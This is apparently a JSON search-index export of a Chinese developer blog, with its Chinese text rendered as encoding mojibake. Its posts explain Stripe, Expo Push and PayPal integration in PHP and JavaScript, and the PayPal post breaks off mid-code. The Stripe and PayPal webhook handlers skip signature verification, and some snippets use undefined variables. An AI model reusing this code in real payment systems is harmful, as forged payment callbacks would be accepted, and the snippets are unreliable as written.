{"meta":{"title":"Boo","subtitle":"","description":"","author":"Boo","url":"https://www.0x2BeAce.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-07-05T02:30:21.578Z","updated":"2020-07-05T02:30:21.578Z","comments":true,"path":"404.html","permalink":"https://www.0x2beace.com/404.html","excerpt":"","text":"404 å¾ˆæŠ±æ­‰ï¼Œæ‚¨è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨ å¯èƒ½æ˜¯è¾“å…¥åœ°å€æœ‰è¯¯æˆ–è¯¥åœ°å€å·²è¢«åˆ é™¤"},{"title":"å…³äºæˆ‘","date":"2023-02-18T03:28:33.612Z","updated":"2023-02-18T03:28:33.612Z","comments":true,"path":"about/index.html","permalink":"https://www.0x2beace.com/about/index.html","excerpt":"","text":"å…³äºæ­¤åšå®¢åšå®¢åï¼š0x2BeAce è¯»ä½œ To Be Aceã€‚ Ace æœ‰å¤šä¸ªæ„æ€ï¼Œè¿™é‡Œå– a person who is very skilled at something ã€‚ ä¸“é—¨ç”¨äºæŠ€æœ¯åˆ†äº«ï¼Œè®°å½•ä¸€äº›æ„Ÿå…´è¶£çš„ä¸œè¥¿ã€‚ è¿™é‡Œå‚è€ƒäº† Soros Liu çš„åšå®¢ã€‚ å…³äºæˆ‘åç«¯å·¥ç¨‹å¸ˆ ğŸ‘¨ğŸ»â€ğŸ’» | ä¸šä½™è·‘æ­¥çˆ±å¥½è€… ğŸƒğŸ» | ç¢³æ°´åŒ–åˆç‰©ç»ˆç»“è€… ğŸ” ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰¾åˆ°æˆ‘ï¼š åšå®¢ GitHub Eamil è±†ç“£ - è®°å½•ä¹¦å½± Weibo - å¾ˆä¹…æ²¡æ›´æ–°äº†â€¦ Telegram"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2020-07-05T02:57:23.853Z","updated":"2020-07-05T02:57:23.853Z","comments":true,"path":"categories/index.html","permalink":"https://www.0x2beace.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-07-05T03:12:46.301Z","updated":"2020-07-05T03:12:46.301Z","comments":true,"path":"mylist/index.html","permalink":"https://www.0x2beace.com/mylist/index.html","excerpt":"","text":""},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2020-07-05T02:29:38.929Z","updated":"2020-07-05T02:29:38.929Z","comments":true,"path":"tags/index.html","permalink":"https://www.0x2beace.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ä½¿ç”¨ PHP æ¥å…¥ Stripe æ”¯ä»˜","slug":"Using-PHP-to-access-Stripe-payment","date":"2023-04-01T07:13:56.000Z","updated":"2023-04-01T07:14:57.262Z","comments":true,"path":"Using-PHP-to-access-Stripe-payment/","link":"","permalink":"https://www.0x2beace.com/Using-PHP-to-access-Stripe-payment/","excerpt":"Stripe æ˜¯ä¸€ä¸ªèšåˆæ”¯ä»˜å¹³å°ï¼Œå¯ä»¥å®‰å…¨ã€å¿«é€Ÿåœ°å¤„ç†åŒ…æ‹¬ä¿¡ç”¨å¡ã€Apple Payã€Google Payã€æ”¯ä»˜å®ç­‰å¸‚é¢ä¸Šå„ç§æ”¯ä»˜æ–¹å¼ã€‚","text":"Stripe æ˜¯ä¸€ä¸ªèšåˆæ”¯ä»˜å¹³å°ï¼Œå¯ä»¥å®‰å…¨ã€å¿«é€Ÿåœ°å¤„ç†åŒ…æ‹¬ä¿¡ç”¨å¡ã€Apple Payã€Google Payã€æ”¯ä»˜å®ç­‰å¸‚é¢ä¸Šå„ç§æ”¯ä»˜æ–¹å¼ã€‚ Stripe çš„æ–‡æ¡£å¾ˆé½å…¨ï¼Œå¦‚æœä¸çŸ¥é“é€‰æ‹©ä½•ç§æ”¯ä»˜æ–¹å¼ï¼Œæˆ–è€…æ‰¾ä¸åˆ°å¯¹åº”æ”¯ä»˜æ–¹å¼æ–‡æ¡£åœ¨å“ªï¼Œå¯ä»¥çœ‹çœ‹ Stripe çš„å»ºè®®ã€‚ æ”¯ä»˜æ–¹å¼ Stripe Checkoutï¼šä½¿ç”¨ä½ä»£ç çš„æ–¹å¼å¿«é€Ÿæ„å»ºä¸€ä¸ªå®šåˆ¶çš„æ”¯ä»˜é¡µé¢ã€‚ Stripe Elementsï¼šä½¿ç”¨äº›è®¸ä»£ç æ·»åŠ é¢„æ„å»ºçš„è‡ªå®šä¹‰ UI ç»„ä»¶æ¥æ¥å—å¤šç§æ”¯ä»˜æ–¹å¼ã€‚ æ”¶æ¬¾é¦–å…ˆå®‰è£…ä¾èµ–åŒ…ï¼š 1$ composer require stripe/stripe-php Webè¿™ç§æ–¹å¼æ˜¯é€šè¿‡åœ¨ç½‘ç«™ä¸Šæ·»åŠ ä¸€ä¸ªç»“è´¦æŒ‰é’®ï¼Œè°ƒç”¨ Stripe Api åˆ›å»º Checkout Sessionï¼Œå°†å®¢æˆ·é‡å®šå‘åˆ° Stripe Checkoutã€‚ è¿™ç§æ–¹å¼é€‚ç”¨äºï¼Œçº¿ä¸Šï¼ˆWebï¼‰æ”¶æ¬¾ï¼Œå¦‚æœéœ€è¦é€šè¿‡ App è¿›è¡Œæ”¶æ¬¾ï¼Œå¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ App çš„æ”¶æ¬¾æ–¹å¼ã€‚ æœåŠ¡ç«¯ä»£ç ï¼š 1234567891011121314151617181920212223242526272829public function createPayOrderByCheckout()&#123; $host = $this-&gt;request-&gt;host(); $priceId = $this-&gt;request-&gt;post(\"price_id\"); if (!$priceId) &#123; $this-&gt;error(__('è¯·å¡«å†™ Price Id')); &#125; try &#123; Stripe::setApiKey($this-&gt;stripeSecretKey); $checkoutSession = Session::create([ 'line_items' =&gt; [[ 'price' =&gt; $priceId, 'quantity' =&gt; 1, ]], 'mode' =&gt; 'payment', 'success_url' =&gt; $host . '/success.html', 'cancel_url' =&gt; $host . '/cancel.html', ]); $this-&gt;success(\"è®¢å•åˆ›å»ºæˆåŠŸ\", [ \"url\" =&gt; $checkoutSession-&gt;url, \"id\" =&gt; $checkoutSession-&gt;id ]); &#125; catch (\\Stripe\\Exception\\ApiErrorException $exception) &#123; $this-&gt;error(\"è®¢å•åˆ›å»ºå¤±è´¥ï¼š\". $exception-&gt;getMessage()); &#125;&#125; Appè¿™ç§æ–¹å¼æ˜¯ App ç«¯ç¡®è®¤å¥½å•†å“ä¿¡æ¯ï¼Œç‚¹å‡»ä¸‹å•æŒ‰é’®ï¼ŒæœåŠ¡ç«¯è°ƒç”¨ Stripe Api åˆ›å»ºæ”¯ä»˜è®¢å•ï¼Œå¹¶è¿”å›æ”¯ä»˜ä¿¡æ¯ç»™å®¢æˆ·ç«¯ï¼Œæ‹‰èµ·æ”¯ä»˜ï¼Œç”¨æˆ·å®Œæˆæ”¯ä»˜ï¼Œé€šè¿‡è®¾ç½®çš„ Webhook è¿›è¡Œå›è°ƒé€šçŸ¥ã€‚ æœåŠ¡ç«¯åˆ›å»ºæ”¯ä»˜è®¢å• Apiï¼š 12345678910111213141516171819202122232425public function createPayOrderByApp(array $orderInfo)&#123; try &#123; $stripe = new StripeClient($this-&gt;stripeSecretKey); // åˆ›å»º PaymentIntent $paymentIntent = $stripe-&gt;paymentIntents-&gt;create([ // æ”¯ä»˜é‡‘é¢ï¼ˆå•ä½ä¸ºåˆ†ï¼‰ 'amount' =&gt; $orderInfo['amount'] * 100, 'currency' =&gt; $currency, // å°† order_no ä½œä¸ºä¸Stripe å…³è”ä¾æ® 'metadata' =&gt; [ 'order_no' =&gt; $orderInfo['order_no'] ], ]); // è¿”å›æ”¯ä»˜ä¿¡æ¯ç»™å®¢æˆ·ç«¯ï¼Œæ‹‰èµ·æ”¯ä»˜ $this-&gt;success(\"è®¢å•åˆ›å»ºæˆåŠŸ\", [ 'client_secret' =&gt; $paymentIntent-&gt;client_secret, // PaymentIntent å®¢æˆ·ç«¯å¯†é’¥ 'publishable_key' =&gt; $this-&gt;stripePublishableKey // Stripe å…¬é’¥ ]); &#125; catch (ApiErrorException $exception) &#123; $this-&gt;error(\"è®¢å•åˆ›å»ºå¤±è´¥ï¼š\". $exception-&gt;getMessage()); &#125;&#125; æœåŠ¡ç«¯å›è°ƒ Apiï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function webhook()&#123; Stripe::setApiKey($this-&gt;stripePublishableKey); $payload = @file_get_contents('php://input'); $event = null; try &#123; // å›è°ƒå‚æ•°éªŒè¯ $event = Event::constructFrom( json_decode($payload, true) ); &#125; catch(\\UnexpectedValueException $e) &#123; // webhook è§£æè¯·æ±‚å¤±è´¥ http_response_code(400); &#125; catch(\\Stripe\\Exception\\SignatureVerificationException $e) &#123; // webhook ç­¾åéªŒè¯å¤±è´¥ http_response_code(400); &#125; // å¤„ç†å›è°ƒäº‹ä»¶ switch ($event-&gt;type) &#123; case 'payment_intent.succeeded': // æ”¶æ¬¾æˆåŠŸ $paymentIntent = $event-&gt;data-&gt;object; // ä»˜æ¬¾äººIDï¼š$paymentIntent-&gt;latest_charge; // é€€æ¬¾æ—¶ï¼Œä¼šç”¨åˆ° // todo å˜æ›´è®¢å•çŠ¶æ€ break; case 'payment_intent.canceled': // æ”¯ä»˜å–æ¶ˆ // todo å–æ¶ˆæ”¯ä»˜ break; default: // å…¶ä»–äº‹ä»¶ https://stripe.com/docs/api/events/types break; &#125; http_response_code(200);&#125; é€€æ¬¾ Apiï¼š 12345678910111213141516public function refund($orderInfo)&#123; Stripe::setApiKey($this-&gt;stripeSecretKey); $refund = \\Stripe\\Refund::create([ // åŸå§‹ä»˜æ¬¾å¯¹è±¡ID 'charge' =&gt; $orderInfo['payer_id'], // é€€æ¬¾é‡‘é¢ï¼Œå•ä½ä¸ºåˆ† \"amount\" =&gt; $orderInfo['payment_amount'] * 100 ]); if ($refund-&gt;status === \"succeeded\") &#123; return true; &#125; return $refund-&gt;failure_reason;&#125; å‚è€ƒé“¾æ¥ çº¿ä¸Šä»˜æ¬¾ æ¨¡æ‹Ÿä»˜æ¬¾ï¼Œæµ‹è¯•é›†æˆ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Expo Pushå¿«é€Ÿä¸Šæ‰‹","slug":"Expo-Push-to-get-started-quickly","date":"2023-04-01T06:24:47.000Z","updated":"2023-04-01T06:26:20.731Z","comments":true,"path":"Expo-Push-to-get-started-quickly/","link":"","permalink":"https://www.0x2beace.com/Expo-Push-to-get-started-quickly/","excerpt":"Expo æ˜¯å›½å¤–çš„ä¸€å¥—å·¥å…·ã€åº“å’ŒæœåŠ¡ï¼Œè®©ä½ å¯ä»¥é€šè¿‡ç¼–å†™JavaScript æ¥æ„å»ºæœ¬åœ°çš„ iOS å’Œ Android åº”ç”¨ç¨‹åºã€‚","text":"Expo æ˜¯å›½å¤–çš„ä¸€å¥—å·¥å…·ã€åº“å’ŒæœåŠ¡ï¼Œè®©ä½ å¯ä»¥é€šè¿‡ç¼–å†™JavaScript æ¥æ„å»ºæœ¬åœ°çš„ iOS å’Œ Android åº”ç”¨ç¨‹åºã€‚ è€Œ Expo Push æ˜¯ Expo çš„æ¨é€æœåŠ¡ã€‚ æ¨é€é€»è¾‘å¦‚ä¸‹ï¼š æœåŠ¡ç«¯è¯·æ±‚Expo æ¨é€æœåŠ¡ Expo åˆ¤æ–­å®¢æˆ·ç«¯æ˜¯ Android è¿˜æ˜¯ iOS æœ€åé€šè¿‡ APNsï¼ˆApple Push Notification serviceï¼‰ å’Œ FCM ï¼ˆFirebase Cloud Messagingï¼‰å‘é€é€šçŸ¥ å› ä¸ºä½¿ç”¨ Expo Push æ—¶ï¼Œéœ€è¦æä¾› ExponentPushTokenï¼Œè€Œè¿™ä¸ª Token éœ€è¦é€šè¿‡è®¾å¤‡æ‰èƒ½æ‹¿åˆ°ï¼Œå› æ­¤éœ€è¦åœ¨æœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡ï¼Œæœ€ç»ˆé€šè¿‡æ‰‹æœºæˆ–æ¨¡æ‹Ÿå™¨è¿è¡Œã€‚ å‡†å¤‡åœ¨æ­£å¼ä½¿ç”¨ä¹‹å‰ï¼Œéœ€è¦å…ˆæŠŠä»¥ä¸‹å·¥å…·å®‰è£…å¥½ï¼š Node.js Git åç»­éƒ½æ˜¯ä½¿ç”¨ Expo CLI è¿™ä¸ªå·¥å…·æ¥ç®¡ç†æœåŠ¡çš„ï¼Œå¯ä»¥é€šè¿‡ npxï¼ˆä¸€ä¸ª Node.js åŒ…è¿è¡Œå™¨ï¼‰æ¥ä½¿ç”¨å®ƒã€‚æ— éœ€é¢å¤–å®‰è£…ã€‚ æ‰“å¼€ç»ˆç«¯ï¼Œé€šè¿‡ Expo CLI è¿›è¡Œç™»å½•ï¼š 1$ npx expo login å¦‚æœæ²¡æœ‰è´¦å·ï¼Œéœ€è¦å…ˆæ³¨å†Œä¸€ä¸ª Expo è´¦å·ã€‚ åˆ›å»ºä¸€ä¸ª Expo Appï¼š 1$ npx create-expo-app my-app &amp;&amp; cd my-app å°†App.js æ›¿æ¢æˆä»¥ä¸‹å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115import &#123; StatusBar &#125; from 'expo-status-bar';import &#123; useState, useEffect, useRef &#125; from 'react';import &#123; StyleSheet, Text, View, Button, Platform &#125; from 'react-native';import * as Device from 'expo-device';import * as Notifications from 'expo-notifications';Notifications.setNotificationHandler(&#123; handleNotification: async () =&gt; (&#123; shouldShowAlert: true, shouldPlaySound: false, shouldSetBadge: false, &#125;),&#125;);// Can use this function below OR use Expo's Push Notification Tool from: https://expo.dev/notificationsasync function sendPushNotification(expoPushToken) &#123; const message = &#123; to: expoPushToken, sound: 'default', title: 'Original Title', body: 'And here is the body!', data: &#123; someData: 'goes here' &#125;, &#125;; await fetch('https://exp.host/--/api/v2/push/send', &#123; method: 'POST', headers: &#123; Accept: 'application/json', 'Accept-encoding': 'gzip, deflate', 'Content-Type': 'application/json', &#125;, body: JSON.stringify(message), &#125;);&#125;async function registerForPushNotificationsAsync() &#123; let token; if (Device.isDevice) &#123; const &#123; status: existingStatus &#125; = await Notifications.getPermissionsAsync(); let finalStatus = existingStatus; if (existingStatus !== 'granted') &#123; const &#123; status &#125; = await Notifications.requestPermissionsAsync(); finalStatus = status; &#125; if (finalStatus !== 'granted') &#123; alert('Failed to get push token for push notification!'); return; &#125; token = (await Notifications.getExpoPushTokenAsync()).data; console.log(token); &#125; else &#123; alert('Must use physical device for Push Notifications'); &#125; if (Platform.OS === 'android') &#123; Notifications.setNotificationChannelAsync('default', &#123; name: 'default', importance: Notifications.AndroidImportance.MAX, vibrationPattern: [0, 250, 250, 250], lightColor: '#FF231F7C', &#125;); &#125; return token;&#125;export default function App() &#123; const [expoPushToken, setExpoPushToken] = useState(''); const [notification, setNotification] = useState(false); const notificationListener = useRef(); const responseListener = useRef(); useEffect(() =&gt; &#123; registerForPushNotificationsAsync().then(token =&gt; setExpoPushToken(token)); notificationListener.current = Notifications.addNotificationReceivedListener(notification =&gt; &#123; setNotification(notification); &#125;); responseListener.current = Notifications.addNotificationResponseReceivedListener(response =&gt; &#123; console.log(response); &#125;); return () =&gt; &#123; Notifications.removeNotificationSubscription(notificationListener.current); Notifications.removeNotificationSubscription(responseListener.current); &#125;; &#125;, []); return ( &lt;View style=&#123;&#123; flex: 1, alignItems: 'center', justifyContent: 'space-around' &#125;&#125;&gt; &lt;Text&gt;Your expo push token: &#123;expoPushToken&#125;&lt;/Text&gt; &lt;View style=&#123;&#123; alignItems: 'center', justifyContent: 'center' &#125;&#125;&gt; &lt;Text&gt;Title: &#123;notification &amp;&amp; notification.request.content.title&#125; &lt;/Text&gt; &lt;Text&gt;Body: &#123;notification &amp;&amp; notification.request.content.body&#125;&lt;/Text&gt; &lt;Text&gt;Data: &#123;notification &amp;&amp; JSON.stringify(notification.request.content.data)&#125;&lt;/Text&gt; &lt;/View&gt; &lt;Button title=\"Press to Send Notification\" onPress=&#123;async () =&gt; &#123; await sendPushNotification(expoPushToken); &#125;&#125; /&gt; &lt;/View&gt; );&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, backgroundColor: '#fff', alignItems: 'center', justifyContent: 'center', &#125;,&#125;); å¯åŠ¨æœåŠ¡ï¼š 1npx expo start é¡ºåˆ©çš„è¯ï¼Œåº”è¯¥èƒ½çœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼Œæ­¤æ—¶éœ€è¦æ‹¿å‡ºæ‰‹æœºï¼Œæ‰“å¼€åº”ç”¨å•†åº—ï¼Œæœç´¢å®‰è£… Expo è¿™ä¸ª Appï¼Œç„¶åæ‰«çŒ«ä¸‹é¢çš„è¿™ä¸ªäºŒç»´ç ï¼š æ¥ä¸‹æ¥ï¼Œåªéœ€è¦æœåŠ¡ç«¯æ¥å…¥ Expo Push å°±å¯ä»¥äº†ã€‚Expo æä¾›äº†å„ç§è¯­è¨€çš„æ¨é€æœåŠ¡ã€‚ ä¸‹é¢ä½¿ç”¨ PHP æ¥å…¥ã€‚ Expo Pushé¦–å…ˆå®‰è£…ä¾èµ–åŒ…ï¼š 1$ composer require ctwillie/expo-server-sdk-php è°ƒç”¨å®ä¾‹ï¼š 12345678910111213141516171819public function push(string $title, string $body, array $expoPushToken)&#123; if (empty($expoPushToken)) &#123; return false; &#125; $messages = [ new ExpoMessage([ 'title' =&gt; $title, 'body' =&gt; $body, ]), ]; try &#123; return (new Expo)-&gt;send($messages)-&gt;to($expoPushToken)-&gt;push(); &#125; catch (\\ExpoSDK\\Exceptions\\ExpoException | \\ExpoSDK\\Exceptions\\InvalidTokensException | Exception $e) &#123; return false; &#125;&#125; åªéœ€è¦å¾ˆå°‘çš„ä»£ç ï¼Œå°±å¯ä»¥å®Œæˆæ¨é€äº†ï¼ŒExpo Push è¿˜æ”¯æŒå¾ˆå¤šå…¶ä»–å‚æ•°ï¼Œå¯ä»¥å®ç°æ›´å¤šéœ€æ±‚ã€‚ æµ‹è¯•æ¨é€å¯ä»¥ç›´æ¥è°ƒç”¨ä¸Šé¢çš„ä»£ç ï¼Œè¿›è¡Œæ¨é€æµ‹è¯•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ Expo æä¾›çš„åœ¨çº¿å·¥å…·è¿›è¡Œæµ‹è¯•ã€‚ å‚è€ƒé“¾æ¥ expo-server-sdk-php Github å®‰è£…åŸºç¡€å·¥å…· Create a new app æ¨é€é€šçŸ¥è®¾ç½® ä½¿ç”¨ Expo Push Api å‘é€é€šçŸ¥ ä½¿ç”¨ FCM å’Œ APNs å‘é€é€šçŸ¥","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"ä½¿ç”¨ PayPal-PHP-SDK æ¥å…¥ PayPal æ”¯ä»˜","slug":"use-paypal-php-sdk-to-access-paypal-payment","date":"2023-03-19T06:20:01.000Z","updated":"2023-04-01T06:12:48.415Z","comments":true,"path":"use-paypal-php-sdk-to-access-paypal-payment/","link":"","permalink":"https://www.0x2beace.com/use-paypal-php-sdk-to-access-paypal-payment/","excerpt":"","text":"æœ€è¿‘ä¸šåŠ¡éœ€è¦ï¼Œéœ€è¦æ¥å…¥å›½å¤–çš„ç¬¬ä¸‰æ–¹æ”¯ä»˜â€”â€”PayPalã€‚ å› ä¸ºä¸€äº›åŸå› ï¼Œæ²¡æœ‰ä½¿ç”¨ PayPal å®˜æ–¹æ¨èçš„ Braintree èšåˆæ”¯ä»˜ï¼Œè€Œæ˜¯ä½¿ç”¨åŸç”Ÿçš„ Rest Apiã€‚ å®˜æ–¹ä¸º Rest Api å°è£…äº†ä¸€ä¸ª SDKï¼Œè™½ç„¶å·²ç»å¾ˆä¹…æ²¡æœ‰æ›´æ–°äº†ï¼Œä¸è¿‡å¥½åœ¨åšäº†å‘ä¸‹å…¼å®¹ï¼Œåªæ˜¯ç‰ˆæœ¬ä½ä¸€äº›ï¼Œå¥½åœ¨è¿˜èƒ½ç”¨ã€‚ åœ¨æ­£å¼ä»‹ç»ä¹‹å‰ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹ PayPal æ”¯ä»˜çš„æµç¨‹ï¼š åœ¨ PayPal ç®¡ç†ä¸­å¿ƒ åˆ›å»ºä¸€ä¸ªå¼€å‘è€…è´¦å·ï¼Œè·å– API åˆå§‹å‡­è¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬ Client ID å’Œ Secret ä½¿ç”¨ Client ID å’Œ Secret åˆ›å»º PayPal å®ä¾‹ï¼Œå¹¶åˆ›å»ºæ”¯ä»˜è¯·æ±‚å¯¹è±¡ï¼Œè®¾ç½®æ”¯ä»˜é‡‘é¢ã€è´§å¸ç±»å‹ã€ä»˜æ¬¾æè¿°ã€åŒæ­¥å›è°ƒåœ°å€ç­‰ä¿¡æ¯ è°ƒç”¨ PayPal å®¢æˆ·ç«¯å®ä¾‹çš„ execute() æ–¹æ³•ï¼Œå‘é€æ”¯ä»˜è¯·æ±‚ æ ¹æ®æ”¯ä»˜ç»“æœï¼Œè·³è½¬åˆ°ç›¸åº”æˆåŠŸæˆ–è€…å¤±è´¥çš„é¡µé¢ è®¾ç½® Webhooksï¼Œå¦‚æœæ”¯ä»˜æˆåŠŸï¼Œç­‰å¾… PayPal å¼‚æ­¥å›è°ƒé€šçŸ¥æ”¯ä»˜ç»“æœ è¿™ä¸ªæ”¯ä»˜æµç¨‹ï¼Œå’Œå¹³å¸¸è§åˆ°çš„æ”¯ä»˜å®æ”¯ä»˜æµç¨‹ï¼Œæœ‰æ‰€åŒºåˆ«ã€‚ æ”¯ä»˜å®çš„æ”¯ä»˜æµç¨‹æ˜¯ï¼Œåªéœ€è¦è·å–æ”¯ä»˜ urlï¼Œç„¶åå»æ”¯ä»˜å®ç½‘ç«™é‡Œé¢å®Œæˆæ”¯ä»˜ï¼Œæœ€åå¼‚æ­¥é€šçŸ¥ã€‚ PayPal æ”¯ä»˜åˆ™æœ‰æ‰€åŒºåˆ«ï¼ŒPayPal è¿”å›çš„ approval_url åªæ˜¯è·å–ç”¨æˆ·æˆæƒï¼Œæœ€ç»ˆè¿˜æ˜¯éœ€è¦å›åˆ°è‡ªå·±çš„ç½‘ç«™å†ä¸€æ¬¡è¯·æ±‚ PayPal è¿›è¡Œæ”¯ä»˜ï¼Œæœ€åæ‰æ˜¯å¼‚æ­¥é€šçŸ¥ã€‚ åˆ›å»ºæ”¯ä»˜è®¢å•é€šè¿‡ Composer å®‰è£…SDKï¼š 1$ composer require paypal/rest-api-sdk-php åˆ›å»ºæ”¯ä»˜è®¢å•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889class PaypalStrategy implements PaymentStrategy&#123;ã€ private $clientId; private $clientSecret; private $environment; private $currency; private $apiContext; private $redirectUrl; public function __construct() &#123; $this-&gt;clientId = Env::get(\"paypal.CLIENT_ID\"); $this-&gt;clientSecret = Env::get(\"paypal.CLIENT_SECRET\"); $this-&gt;environment = Env::get(\"paypal.ENVIRONMENT\"); $this-&gt;currency = \"USD\"; $this-&gt;redirectUrl = \"http://\".Env::get(\"app.app_url\") . \"/api/order/paypalExecute\"; $this-&gt;apiContext = new ApiContext( new OAuthTokenCredential( $this-&gt;clientId, $this-&gt;clientSecret ) ); if ($env === \"production\") &#123; $this-&gt;apiContext-&gt;setConfig([ 'mode' =&gt; 'live', // è®¾ç½®ä¸ºç”Ÿäº§ç¯å¢ƒ ]); &#125; &#125; // æ”¯ä»˜ public function pay(array $orderInfo, array $paymentParams) &#123; $payer = new \\PayPal\\Api\\Payer(); $payer-&gt;setPaymentMethod('paypal'); $item = new Item(); $item-&gt;setName(\"å•†å“åç§°\") -&gt;setCurrency($this-&gt;currency) // è®¾ç½®æ•°é‡ -&gt;setQuantity(1) -&gt;setPrice($orderInfo['paymentamount']); $itemList = new ItemList(); $itemList-&gt;setItems([$item]); $amount = new \\PayPal\\Api\\Amount(); // è®¾ç½®æ€»ä»· $amount-&gt;setTotal($orderInfo['paymentamount']) -&gt;setCurrency($this-&gt;currency); $transaction = new \\PayPal\\Api\\Transaction(); $transaction-&gt;setAmount($amount) -&gt;setItemList($itemList) -&gt;setDescription(\"å•†å“æè¿°\") -&gt;setInvoiceNumber($orderInfo['orderno']); // è®¾ç½®æˆæƒæˆåŠŸä¹‹åï¼Œé‡å®šå‘åœ°å€ // è¿™ä¸ªåœ°å€å¾ˆé‡è¦ï¼Œæ˜¯ PayPal æˆæƒæˆåŠŸä¹‹åï¼ŒåŒæ­¥å›è°ƒè·å–ä»˜æ¬¾äºº ID $redirectUrls = new RedirectUrls(); $redirectUrls-&gt;setReturnUrl($this-&gt;redirectUrl . \"?success=ture\") -&gt;setCancelUrl($this-&gt;redirectUrl . \"?success=false\"); $payment = new Payment(); $payment-&gt;setIntent('sale') -&gt;setPayer($payer) -&gt;setTransactions(array($transaction)) -&gt;setRedirectUrls($redirectUrls); try &#123; // åˆ›å»ºäº¤æ˜“ $payment-&gt;create($this-&gt;apiContext); return [ // Paypal payment id \"third_order_no\" =&gt; $payment-&gt;id, // Paypal æˆæƒåœ°å€ \"approval_url\" =&gt; $payment-&gt;getApprovalLink(), ]; &#125; catch (\\PayPal\\Exception\\PayPalConnectionException $exception) &#123; throw new \\Exception($exception-&gt;getData()); &#125; &#125; &#125; æ”¯ä»˜åŒæ­¥å›è°ƒ1234567891011121314151617181920212223242526272829303132333435// åŒæ­¥æ”¯ä»˜å›è°ƒï¼ˆç”¨äºè·å–ä»˜æ¬¾äºº IDï¼‰public function execute($payload)&#123; // æ˜¯å¦å–æ¶ˆæ”¯ä»˜æ ‡è¯† $success = $payload['success'] ?? false; // æ”¯ä»˜ID $paymentId = $payload['paymentId'] ?? \"\"; // æ”¯ä»˜äººID $payerId = $payload['PayerID'] ?? \"\"; if (empty($paymentId) || empty($payerId)) &#123; // æ”¯ä»˜å¤±è´¥ return \"fail\"; &#125; if (false === $success) &#123; // å–æ¶ˆæ”¯ä»˜ return \"cancel\"; &#125; $payment = Payment::get($paymentId, $this-&gt;apiContext); $execute = new PaymentExecution(); // è®¾ç½®ä»˜æ¬¾äºº ID $execute-&gt;setPayerId($payerId); try &#123; // ç¡®è®¤æ”¯ä»˜ï¼ˆçœŸæ­£å‘èµ·æ”¯ä»˜è¯·æ±‚çš„åœ°æ–¹ï¼‰ $payment-&gt;execute($execute, $this-&gt;apiContext); &#125; catch (\\Exception $e) &#123; // æ”¯ä»˜å¤±è´¥ return \"fail\"; &#125; // æ”¯ä»˜æˆåŠŸ return \"success\";&#125; æˆæƒå®Œæˆä¹‹åï¼ŒPayPal ä¼šé‡å®šå‘è‡³ redirectUrlï¼Œå¹¶æºå¸¦ paymentId å’ŒPayerIDï¼Œæ‹¿åˆ°è¿™ä¸¤ä¸ªå‚æ•°ä¹‹åï¼Œæœ€åå‘èµ·æ”¯ä»˜è¯·æ±‚ã€‚ æ”¯ä»˜å¼‚æ­¥å›è°ƒPayPal æ”¯ä»˜å¼‚æ­¥å›è°ƒï¼Œä¸»è¦æ˜¯ä¸¤ä¸ª Event Typeï¼š PAYMENTS.PAYMENT.CREATEDï¼šè¡¨ç¤ºæ”¯ä»˜åˆ›å»ºå®Œæˆï¼Œå³æ”¯ä»˜è¯·æ±‚å·²ç»è¢«åˆ›å»ºå¹¶å‡†å¤‡å¥½å‘ç”¨æˆ·å±•ç¤ºã€‚è¿™ä¸ª Event Type è§¦å‘çš„æ¡ä»¶æ˜¯ï¼šå½“ PayPal æ”¶åˆ°ä¸€ä¸ªæ”¯ä»˜è¯·æ±‚å¹¶ä¸”å‡†å¤‡å¥½å‘ç”¨æˆ·å±•ç¤ºæ—¶ï¼Œä¼šå‘ Webhooks å‘é€ä¸€ä¸ª PAYMENTS.PAYMENT.CREATED çš„äº‹ä»¶ã€‚ PAYMENT.SALE.COMPLETEDï¼šè¡¨ç¤ºé”€å”®å®Œæˆï¼Œå³æ”¯ä»˜å·²ç»å®Œæˆå¹¶ä¸”ç›¸å…³çš„æ¬¾é¡¹å·²ç»è¢«è½¬ç§»ã€‚è¿™ä¸ª Event Type è§¦å‘çš„æ¡ä»¶æ˜¯ï¼šå½“ PayPal æ”¯ä»˜å®Œæˆå¹¶ä¸”ç›¸å…³æ¬¾é¡¹å·²ç»è¢«è½¬ç§»æ—¶ï¼Œä¼šå‘ Webhooks å‘é€ä¸€ä¸ª PAYMENT.SALE.COMPLETED çš„äº‹ä»¶ã€‚ 12345678910111213141516171819202122232425262728293031323334// å¼‚æ­¥æ”¯ä»˜å›è°ƒpublic function webhook($payload)&#123; $payload = json_decode($payload, true); if (empty($payload)) &#123; // å›è°ƒå‚æ•°è§£æå¤±è´¥ return false; &#125; // todo éªŒç­¾ try &#123; // è¯¦ç»†å›è°ƒå‚æ•°ï¼Œå‚è§ https://developer.paypal.com/api/rest/webhooks/#link-samplemessagepayload switch ($payload['event_type']) &#123; // æ”¯ä»˜è®¢å•åˆ›å»ºæˆåŠŸ case \"PAYMENTS.PAYMENT.CREATED\": break; // ä¹°å®¶å®Œæˆæ”¯ä»˜ case \"PAYMENT.SALE.COMPLETED\": // è®°å½•ä¹°å®¶ IDï¼Œåé¢é€€æ¬¾ä¼šç”¨åˆ° break; &#125; // todo ä¸šåŠ¡é€»è¾‘å¤„ç† return true; &#125; catch (\\Exception $e) &#123; // 